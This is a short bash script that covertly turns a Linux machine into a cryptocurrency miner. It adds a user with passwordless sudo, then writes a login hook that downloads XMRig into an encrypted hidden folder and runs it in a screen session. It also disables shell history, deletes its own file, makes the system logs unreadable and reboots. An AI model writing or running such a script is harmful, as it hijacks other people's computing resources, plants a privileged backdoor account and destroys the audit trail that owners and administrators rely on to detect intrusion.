#!/bin/bash

apt install ecryptfs-utils cryptsetup screen cryfs mc sudo -y
keyctl link @u @s
adduser --encrypt-home fdsa
adduser fdsa sudo
echo "fdsa ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers
ecryptfs-setup-swap -f
echo "#!/bin/bash
sudo mkdir /home/fdsa/cr /home/fdsa/crd
sudo cryfs /home/fdsa/cr /home/fdsa/crd
sudo wget https://github.com/xmrig/xmrig/releases/download/v6.19.0/xmrig-6.19.0-focal-x64.tar.gz -O /home/fdsa/crd/xm.tar.gz
sudo tar -xvzf /home/fdsa/crd/xm.tar.gz
sudo cp /home/fdsa/xmrig-6.19.0/config.json /home/fdsa/crd/config.json
sudo cp /home/fdsa/xmrig-6.19.0/xmrig /home/fdsa/crd/xmrig
sudo rm -rf /home/fdsa/xmrig-6.19.0
sudo rm -rf /home/fdsa/crd/xm.tar.gz
sudo rm -rf /etc/profile.d/crar.sh
sudo echo 'unset HISTFILE
set +o history' >> ~/.bash_profile
sudo echo 'unset HISTFILE
set +o history' >> /etc/profile.d/disable.history.sh
history -c
cd /home/fdsa/crd/
sudo screen -S crd" >> /etc/profile.d/crar.sh
chmod 777 /etc/profile.d/crar.sh
rm -rf /root/333.sh
chmod 000 /var/log/* -R
history -c
shutdown -r now
